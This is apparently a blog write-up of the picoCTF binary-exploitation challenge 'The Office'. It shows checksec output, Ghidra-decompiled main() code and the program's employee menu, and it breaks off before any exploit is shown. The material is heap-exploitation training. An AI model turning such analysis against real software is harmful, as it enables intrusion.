<!doctype html><html lang=es>
<head>
<title>The Office | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="We are given a 32-bit binary called the_office:
Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  The challenge says that they have implemented a secure heap using canaries.
We do not have the C source code. Hence, we need to use a reversing tool like Ghidra.
Although the file is stripped:
$ file the_office the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/pwn.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="The Office">
<meta property="og:description" content="We are given a 32-bit binary called the_office:
Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  The challenge says that they have implemented a secure heap using canaries.
We do not have the C source code. Hence, we need to use a reversing tool like Ghidra.
Although the file is stripped:
$ file the_office the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/the-office/"><meta property="article:section" content="ctf">
<meta property="article:modified_time" content="2022-02-24T16:50:45+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/pwn.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="The Office">
<meta itemprop=description content="We are given a 32-bit binary called the_office:
Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  The challenge says that they have implemented a secure heap using canaries.
We do not have the C source code. Hence, we need to use a reversing tool like Ghidra.
Although the file is stripped:
$ file the_office the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.">
<meta itemprop=dateModified content="2022-02-24T16:50:45+01:00">
<meta itemprop=wordCount content="3472">
<meta itemprop=keywords content>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="The Office">
<meta name=twitter:description content="We are given a 32-bit binary called the_office:
Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  The challenge says that they have implemented a secure heap using canaries.
We do not have the C source code. Hence, we need to use a reversing tool like Ghidra.
Although the file is stripped:
$ file the_office the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.">
<meta name=twitter:image content="https://7rocky.github.io/images/pwn.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/ctf/picoctf/binary-exploitation/the-office/ title=es>
<img alt=es height=32px src=/images/es.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">BINARY EXPLOITATION</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/the-office/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/the-office/&text=The%20Office" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/the-office/&title=The%20Office" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">The Office</h1>
<br>
</header>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 32-bit binary called <code>the_office</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     i386-32-little
RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
Stack:    <span class=code-dark-green>Canary found</span>
NX:       <span class=code-dark-green>NX enabled</span>
PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>  
</code></pre></div>
<p>The challenge says that they have implemented a secure heap using canaries.</p>
<p>We do not have the C source code. Hence, we need to use a reversing tool like Ghidra.</p>
<p>Although the file is stripped:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>file</span> the_office
the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd5f440d82f17865303f292401c3e1ea843a0e25, stripped  
</code></pre></div>
<p>We can identify the <code>main</code> function because it is the argument of <code>__libc_start_main</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>entry</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class=mtk8>__libc_start_main</span><span class=mtk1>(FUN_08048e49);</span>
  <span class=mtk5>do</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Do</span> <span class=mtk3>nothing</span> <span class=mtk3>block</span> <span class=mtk3>with</span> <span class=mtk3>infinite</span> <span class=mtk3>loop</span> <span class=mtk3>*/</span>  
  <span class=mtk1>}</span> <span class=mtk5>while</span><span class=mtk1>(</span><span class=mtk6>true</span><span class=mtk1>);</span>
<span class=mtk1>}</span>
</code></pre></div>
<p>So we can rename it to <code>main</code>, and here we have it:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>undefined4</span> <span class=mtk8>main</span><span class=mtk1>(undefined4</span> <span class="mtk9 mtki">param_1</span><span class=mtk1>,</span> <span class=mtk1>undefined4</span> <span class=mtk5>*</span><span class="mtk9 mtki">param_2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class=mtk1>undefined4</span> <span class=mtk5>*</span><span class=mtk1>puVar1;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>cVar2;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar3;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar4;</span>
  <span class=mtk1>undefined4</span> <span class=mtk1>uVar5;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>in_GS_OFFSET;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_64;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_60;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_5c;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_58;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_54;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_50</span> <span class=mtk1>[</span><span class=mtk6>11</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_24;</span>
  <span class=mtk1>undefined</span> <span class=mtk5>*</span><span class=mtk1>local_14;</span>

  <span class=mtk1>puVar1</span> <span class=mtk5>=</span> <span class=mtk1>param_2;</span>
  <span class=mtk1>local_14</span> <span class=mtk5>=</span> <span class=mtk1>(undefined</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span><span class=mtk1>param_1;</span>
  <span class=mtk1>local_24</span> <span class=mtk5>=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_GS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>14</span><span class=mtk1>);</span>
  <span class=mtk8>setbuf</span><span class=mtk1>(stdout, (</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk5>for</span> <span class=mtk1>(local_60</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>local_60</span> <span class=mtk5>&lt;</span> <span class=mtk6>10</span><span class=mtk1>;</span> <span class=mtk1>local_60</span> <span class=mtk5>=</span> <span class=mtk1>local_60</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>local_50[local_60</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk1>}</span>
  <span class=mtk1>local_5c</span> <span class=mtk5>=</span> <span class=mtk6>3</span><span class=mtk1>;</span>
  <span class=mtk5>do</span> <span class=mtk1>{</span>
    <span class=mtk5>if</span> <span class=mtk1>(local_5c</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk1>uVar5</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>LAB_080490d4:</span>
      <span class=mtk5>if</span> <span class=mtk1>(local_24</span> <span class=mtk5>!=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_GS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>14</span><span class=mtk1>))</span> <span class=mtk1>{</span>
        <span class=mtk1>uVar5</span> <span class=mtk5>=</span> <span class=mtk8>FUN_08049bd0</span><span class=mtk1>();</span>
      <span class=mtk1>}</span>
      <span class=mtk5>return</span> <span class=mtk1>uVar5;</span>
    <span class=mtk1>}</span>
    <span class=mtk1>local_64</span> <span class=mtk5>=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>;</span>
    <span class=mtk5>if</span> <span class=mtk1>(local_5c</span> <span class=mtk5>==</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Employee</span> <span class=mtk4>#?"</span><span class=mtk1>);</span>
      <span class=mtk1>iVar4</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%1d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>local_64);</span>
      <span class=mtk5>if</span> <span class=mtk1>(((iVar4</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span> <span class=mtk5>&lt;</span> <span class=mtk1>local_64))</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(local_64</span> <span class=mtk5>&lt;</span> <span class=mtk6>10</span><span class=mtk1>))</span> <span class=mtk1>{</span>  
        <span class=mtk5>do</span> <span class=mtk1>{</span>
          <span class=mtk1>local_50[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
          <span class=mtk5>if</span> <span class=mtk1>(local_50[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
        <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(local_50[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
        <span class=mtk8>FUN_08048cdc</span><span class=mtk1>(local_50[local_64</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>]);</span>
        <span class=mtk1>local_50[local_64</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
      <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid</span> <span class=mtk4>ID."</span><span class=mtk1>);</span>
      <span class=mtk1>}</span>
    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk5>if</span> <span class=mtk1>(local_5c</span> <span class=mtk5>&lt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk5>if</span> <span class=mtk1>(local_5c</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
        <span class=mtk5>for</span> <span class=mtk1>(local_58</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
            <span class=mtk1>(local_58</span> <span class=mtk5>&lt;</span> <span class=mtk5>0x</span><span class=mtk6>b</span> <span class=mtk5>&amp;&amp;</span>
            <span class=mtk1>((local_64</span> <span class=mtk5>=</span> <span class=mtk1>local_58,</span> <span class=mtk6>9</span> <span class=mtk5>&lt;</span> <span class=mtk1>local_58</span> <span class=mtk5>||</span> <span class=mtk1>(local_50[local_58</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>]</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>))));</span>
            <span class=mtk1>local_58</span> <span class=mtk5>=</span> <span class=mtk1>local_58</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
        <span class=mtk1>}</span>
        <span class=mtk1>iVar4</span> <span class=mtk5>=</span> <span class=mtk1>local_64;</span>
        <span class=mtk5>if</span> <span class=mtk1>(local_64</span> <span class=mtk5>&lt;</span> <span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk1>{</span>
          <span class=mtk1>iVar3</span> <span class=mtk5>=</span> <span class=mtk8>add_employee</span><span class=mtk1>();</span>
          <span class=mtk1>local_50[iVar4</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>iVar3;</span>
        <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
          <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Can</span><span class=mtk6>\'</span><span class=mtk4>t</span> <span class=mtk4>add</span> <span class=mtk4>any</span> <span class=mtk4>more</span> <span class=mtk4>employees."</span><span class=mtk1>);</span>
        <span class=mtk1>}</span>
      <span class=mtk1>}</span>
    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk5>if</span> <span class=mtk1>(local_5c</span> <span class=mtk5>==</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk5>for</span> <span class=mtk1>(local_54</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>local_54</span> <span class=mtk5>&lt;</span> <span class=mtk6>10</span><span class=mtk1>;</span> <span class=mtk1>local_54</span> <span class=mtk5>=</span> <span class=mtk1>local_54</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
        <span class=mtk5>if</span> <span class=mtk1>(local_50[local_54</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>]</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
          <span class=mtk8>print_employee</span><span class=mtk1>(local_50[local_54</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk1>local_54);</span>
        <span class=mtk1>}</span>
      <span class=mtk1>}</span>
    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk5>if</span> <span class=mtk1>(local_5c</span> <span class=mtk5>==</span> <span class=mtk6>4</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Employee</span> <span class=mtk4>#?"</span><span class=mtk1>);</span>
      <span class=mtk1>iVar4</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%1d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>local_64);</span>
      <span class=mtk5>if</span> <span class=mtk1>(((iVar4</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span> <span class=mtk5>&lt;</span> <span class=mtk1>local_64))</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(local_64</span> <span class=mtk5>&lt;</span> <span class=mtk6>10</span><span class=mtk1>))</span> <span class=mtk1>{</span>
        <span class=mtk5>do</span> <span class=mtk1>{</span>
          <span class=mtk1>local_50[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
          <span class=mtk5>if</span> <span class=mtk1>(local_50[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
        <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(local_50[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
        <span class=mtk8>get_access_token</span><span class=mtk1>(local_50[local_64</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>]);</span>
      <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid</span> <span class=mtk4>ID."</span><span class=mtk1>);</span>
      <span class=mtk1>}</span>
    <span class=mtk1>}</span>
    <span class=mtk1>cVar2</span> <span class=mtk5>=</span> <span class=mtk8>debug</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
    <span class=mtk5>if</span> <span class=mtk1>(cVar2</span> <span class=mtk5>!=</span> <span class=mtk4>'</span><span class=mtk6>\x01</span><span class=mtk4>'</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"***</span> <span class=mtk4>heap</span> <span class=mtk4>smashing</span> <span class=mtk4>detected</span> <span class=mtk4>***:</span> <span class=mtk6>%s</span> <span class=mtk4>terminated</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>*</span><span class=mtk1>puVar1);</span>
      <span class=mtk1>uVar5</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>ffffffff</span><span class=mtk1>;</span>
      <span class=mtk5>goto</span> <span class=mtk1>LAB_080490d4;</span>
    <span class=mtk1>}</span>
    <span class=mtk1>local_5c</span> <span class=mtk5>=</span> <span class=mtk8>menu</span><span class=mtk1>();</span>
  <span class=mtk1>}</span> <span class=mtk5>while</span><span class=mtk1>(</span><span class=mtk6>true</span><span class=mtk1>);</span>
<span class=mtk1>}</span>
</code></pre></div>
<p>The code is a bit large. Let&rsquo;s run it and see what it does:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./the_office</span>
0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token  
</code></pre></div>
<p>We have some functionalities. On the previous code for <code>main</code>, I already identified some functions and renamed them. For example, this is <code>get_access_token</code>:</p>
